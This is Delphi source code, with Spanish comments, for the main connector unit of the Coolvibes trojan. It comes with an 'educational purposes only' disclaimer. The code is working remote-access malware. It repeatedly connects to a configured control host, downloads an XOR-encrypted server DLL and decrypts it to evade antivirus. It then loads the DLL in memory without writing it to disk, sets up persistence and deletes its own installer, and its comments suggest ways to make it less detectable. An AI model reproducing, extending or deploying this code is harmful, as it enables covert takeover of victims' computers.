{Unit principal del Conectador del troyano Coolvibes}
(* Este código fuente se ofrece sólo con fines educativos.
   Queda absolutamente prohibido ejecutarlo en computadores
   cuyo dueño sea una persona diferente de usted, a no ser
   que el dueño haya dado permiso explicito de usarlo.

   En cualquier caso, ni www.indetectables.net  ni ninguno de
   los creadores de Coolvibes será responsable de cualquier
   consecuencia de usar este programa. Si no acepta esto por
   favor no compile el programa y borrelo ahora mismo.

     El equipo Coolvibes
*)
library Conectador; //Para inyectar descomentar
//program Conectador; //Para no inyectar descomentar
uses
  Windows,
  BTMemoryModule, //Para cargar una DLL en memoria sin escribir en disco
  SettingsDef,
  WinSock,
  shellapi,
  UnitInstalacion,
  vars,
  Shfolder,
  Minireg;
var
  dllc             : string;
  i                : integer;
  MCompartida      : THandle;
  ConfigCompartida : PConfigCompartida;
  Indice           : string;
  ClaveCifrado1, ClaveCifrado2 : integer; //Claves para cifrar el plugin
  Loaded           : integer;
  TID              : longword;


Function GetCurrentDirectory: String;     //conseguir dir actual sin sysutils
Var
  a:string;
Begin
 a := paramstr(0);
 while pos('\', a) > 0 do
 begin
  Result := result+Copy(a, 1, Pos('\', a));
  Delete(a, 1, Pos('\', a));
  end;
End;

function cifrar(text: ansistring;i:integer): ansistring;
var
  iloop         :integer;
begin
  for iloop := 1 to length(text) do
  begin
    text[iloop] := chr(ord(text[iloop]) xor i);//funcion de cifrado simple para evadir antiviruses
  end;
  result := text;
end;

function readfile(filename: string): ansistring; //Leer archivo
var
  f               : file;
  buffer          : ansistring;
  size            : integer;
  defaultfilemode : byte;
begin
  result := '';
  defaultfilemode := filemode;
  filemode := 0;
  assignfile(f, filename);
  reset(f, 1);

  if (ioresult = 0) then
  begin
    size := filesize(f);

    setlength(buffer, size);
    blockread(f, buffer[1], size);
    result := buffer;

    closefile(f);
  end;

  filemode := defaultfilemode;
end;

procedure loaddll(path:string);   //Funcion para cargar el servidor en memoria
var
  content : string;
  p,p2 : pointer;
  m_DllDataSize: cardinal;
  CargarServidor : procedure(P:Pointer);
  Module : PBTMemoryModule;
begin
  content := readfile(path);
  content := cifrar(content,ClaveCifrado2);
  content := cifrar(content,ClaveCifrado1);
  p := @content[1];
  m_DllDataSize := length(content);

  if(length(content) > 0) then
  begin
    Module := BTMemoryLoadLibary(p, m_DllDataSize);
    if Module <> nil then
    begin
      CargarServidor := BTMemoryGetProcAddress(Module, 'CargarServidor');  //Para mas indetectabilidad quizas se le deberia cambiar el nombre a la funcion 'CargarServidor'
      CargarServidor(@configuracion); //Se inicia Coolserver.dll y se le manda la configuracion
    end;
  end;

  Loaded := Loaded+1;  //Veces que ha sido cargada
  if(Loaded>10) then
  begin
    if(fileexists(Pchar(path))) then
      deletefile(Pchar(path));      //Falla la carga de la dll mas de 10 veces... la borramos y se la pedimos otra vez al cliente
    Loaded := 0;
  end;
end;


function GetIPFromHost(const HostName: string): string;
type
  TaPInAddr = array[0..10] of PInAddr;
  PaPInAddr = ^TaPInAddr;
var
  phe: PHostEnt;
  pptr: PaPInAddr;
  i: Integer;
begin
  Result := '';
  phe := GetHostByName(PChar(HostName));
  if phe = nil then Exit;
  pPtr := PaPInAddr(phe^.h_addr_list);
  i := 0;
  while pPtr^[i] <> nil do
  begin
    Result := inet_ntoa(pptr^[i]^);
    Inc(i);
  end;
end;


procedure iniciar();
var
   host:         String;
   port:         integer;
   wsaData:      TWSAData;
   lSocket:      TSocket;
   Addr:         TSockAddrIn;
   Enviar:       String;
   buf:          Array [0..0] of char;
   desco:        boolean;
   iRecv:        int64;
   ssize:        string;
   isize:        int64;
   plugin:       file;
   TotalRead:    integer;
   CurrRead:     integer;
   CurrWritten:  integer;
   ByteArray:   array[0..1023] of char;
begin
    desco := false;
        {while fileExists(dllc) do //ya tenemos la dll
           loaddll(dllc);
                             }
     if indice = '' then
        indice := configuracion.shosts;
    host := Copy(indice, 1, Pos(':', indice) -1 );
    Delete(indice, 1, Pos(':', indice));
    Port := strtoint(Copy(indice, 1, Pos('¬', indice) -1 ));
    Delete(indice, 1, Pos('¬', indice));

   if (WSAStartup($0202, wsaData) <> 0) then  //iniciamos winsock
     Exit;  //error


   lSocket := Socket(AF_INET, SOCK_STREAM, 0);
   Addr.sin_family   := AF_INET;
   Addr.sin_port     := htons(Port);
   Addr.sin_addr.S_addr := INET_ADDR(PChar(GetIPFromHost(Host)));


   if (winsock.Connect(lSocket, Addr, SizeOf(Addr)) = 0) then     //intentamos conectar
   begin //conectados

     Enviar := 'GETSERVER|'+inttostr(clavecifrado1)+'|'+inttostr(clavecifrado2)+'|'+#13+#10;
     Send(lSocket, Enviar[1], length(Enviar), 0);  //pedimos el tamaño del servidor
     desco := false;
     iRecv := 0;
     ZeroMemory(@buf, SizeOf(buf));
     iRecv := Recv(lSocket, buf, SizeOf(buf), 0);   //Tenemos que leer el MAININFO
     while (iRecv > 0) do
     begin
       if(iRecv = INVALID_SOCKET) then
       begin
         desco := true;
         break;
       end;

       if(buf[0] = #14) then break;
       ZeroMemory(@buf, SizeOf(buf));
       iRecv := Recv(lSocket, buf, SizeOf(buf), 0);
     end;        //ya hemos recibido el MAININFO, ahora toca intentar recibir el tamaño

     if(desco) then
     begin
       CloseSocket(lSocket);
       exit; //nos hemos desconectado
     end;

      ssize := '';
      ZeroMemory(@buf, SizeOf(buf));
     iRecv := Recv(lSocket, buf, SizeOf(buf), 0);   //Recibimos el tamaño
     while (iRecv > 0) do
     begin
       if(iRecv = INVALID_SOCKET) then
       begin
         desco := true;
         break;
       end;

       if(buf[0] = #14) then break;
       if(buf[0] <> #10) and (buf[0] <> #13) then
       ssize := ssize+buf[0];
       ZeroMemory(@buf, SizeOf(buf));
       iRecv := Recv(lSocket, buf, SizeOf(buf), 0);
     end;
   end;

     if(desco) then
     begin
       CloseSocket(lSocket);
       exit; //nos hemos desconectado
     end;
   isize := strtoint(ssize);//ya tenemos el tamaño
    if(isize <> 0) then
    begin

   AssignFile(plugin, dllc);
   Rewrite(plugin, 1);
   Totalread := 0;

   while (TotalRead < isize) do
   begin
     ZeroMemory(@byteArray, SizeOf(byteArray));
     currRead := Recv(lSocket, byteArray, SizeOf(byteArray), 0);   //GOGOGO
     if(currRead = INVALID_SOCKET) then
     begin
       desco := true;
       break;
     end;
     TotalRead := TotalRead + currRead;
     BlockWrite(plugin, bytearray, currRead,currwritten);
     currwritten := currRead;
   end;

   CloseFile(plugin);
   end;

     if(desco) then
     begin
       DeleteFile(Pchar(dllc));
       CloseSocket(lSocket);
       exit; //nos hemos desconectado
     end;

end;





procedure loadsettings();
var
    ConfigLeida: PSettings;
begin
     //Leerlo de la config?
  if ReadSettings(ConfigLeida) = True then   //Como no estoy injectado puedo leer la configuracion como siempre
    begin
      Configuracion.sHosts                       := ConfigLeida^.sHosts;
      Configuracion.sID                          := ConfigLeida^.sID;
      Configuracion.bCopiarArchivo               := ConfigLeida^.bCopiarArchivo;
      Configuracion.sFileNameToCopy              := ConfigLeida^.sFileNameToCopy;
      Configuracion.sCopyTo                      := ConfigLeida^.sCopyTo;
      Configuracion.bCopiarConFechaAnterior      := ConfigLeida^.bCopiarConFechaAnterior;
      Configuracion.bMelt                        := ConfigLeida^.bMelt;
      Configuracion.bArranqueRun                 := ConfigLeida^.bArranqueRun;
      Configuracion.sRunRegKeyName               := ConfigLeida^.sRunRegKeyName;
      Configuracion.bArranqueActiveSetup         := ConfigLeida^.bArranqueActiveSetup;
      Configuracion.sActiveSetupKeyName          := ConfigLeida^.sActiveSetupKeyName;
      Configuracion.sPluginName                  := ConfigLeida^.sPluginName;
      dllc                                       := GetSpecialFolderPath(CSIDL_LOCAL_APPDATA)+ConfigLeida^.sPluginName;
    end
    else
    begin
      //Estoy corriendo como injectado, así que tengo que leer la configuración escrita por Injector.exe desde memoria
      MCompartida:=OpenFileMapping(FILE_MAP_READ,False,'Config');

      if(MCompartida <> 0) then //Leida con Éxito :D
      begin
        ConfigCompartida:=MapViewOfFile(Mcompartida,FILE_MAP_READ,0,0,0);
        //Quizás habría que guardar esta configuración cifrada...
        Configuracion.sHosts                   := ConfigCompartida.sHosts;
        Configuracion.sID                      := ConfigCompartida.sID;
        Configuracion.bCopiarArchivo           := ConfigCompartida.bCopiarArchivo;
        Configuracion.sFileNameToCopy          := ConfigCompartida.sFileNameToCopy;
        Configuracion.sCopyTo                  := ConfigCompartida.sCopyTo;
        Configuracion.bCopiarConFechaAnterior  := ConfigCompartida.bCopiarConFechaAnterior;
        Configuracion.bMelt                    := ConfigCompartida.bMelt;
        Configuracion.bArranqueRun             := ConfigCompartida.bArranqueRun;
        Configuracion.sRunRegKeyName           := ConfigCompartida.sRunRegKeyName;
        Configuracion.bArranqueActiveSetup     := ConfigCompartida.bArranqueActiveSetup;
        Configuracion.sActiveSetupKeyName      := ConfigCompartida.sActiveSetupKeyName;
        Configuracion.sPluginName              := ConfigCompartida.sPluginName;
        Configuracion.sInyectadorFile          := ConfigCompartida.sInyectadorFile;
        UnmapViewOfFile(ConfigCompartida);
        CloseHandle(MCompartida); //La escribimos
        dllc := GetSpecialFolderPath(CSIDL_LOCAL_APPDATA)+Configuracion.sPluginName;
      end
      else
      begin
        //Para Debug
        Exitprocess(0);
        {Configuracion.sHosts                  := 'localhost:77¬';
        Configuracion.sID                     := 'v';
        Configuracion.bCopiarArchivo          := false;
        Configuracion.sFileNameToCopy         := 'w.exe';
        Configuracion.sCopyTo                 := '%AppDir%\';
        Configuracion.bCopiarConFechaAnterior := False;
        Configuracion.bMelt                   := False;
        Configuracion.bArranqueRun            := false;
        Configuracion.sRunRegKeyName          := 'w';
        Configuracion.bArranqueActiveSetup    := false;
        Configuracion.sActiveSetupKeyName     := '{t';
        Configuracion.sPluginName             := 's.dll';
				//Configuracion.sInyectadorFile         := '';
        dllc := GetCurrentDirectory+Configuracion.sPluginName;  }
        //Fin de Para debug
      end;
  end;

      ClaveCifrado1 := ord(Configuracion.shosts[length(Configuracion.shosts)-(length(Configuracion.shosts) div 2)+1]);
      ClaveCifrado2 := ord(Configuracion.shosts[length(Configuracion.shosts)-(length(Configuracion.shosts) div 2)]);
end;


procedure main;
begin
 while true do
 begin
    while fileExists(dllc) do
      loaddll(dllc);
    iniciar();
    sleep(10000); //Cada 10 segundos
  end;
end;


begin
  if ParamStr(1) = '\melt' then  //Esto pasará solamente si no tenemos la opción de inyectar
    begin
      //Borro el archivo de instalación, reintento 5 veces por si las moscas :)
      for i := 1 to 5 do
      begin
        if not FileExists(ParamStr(2)) then
          break
        else
          DeleteFile(Pchar(ParamStr(2)));
        Sleep(10);
      end;
    end; //Termina el Melt

  loadsettings();  //Leemos la configuración
  Instalar();
  BeginThread(nil,0,Addr(Main),0,0,TID);
  exitthread(0);   //Si tenemos la opción de persistencia activa esto le avisará que hemos leido la configuración
end.
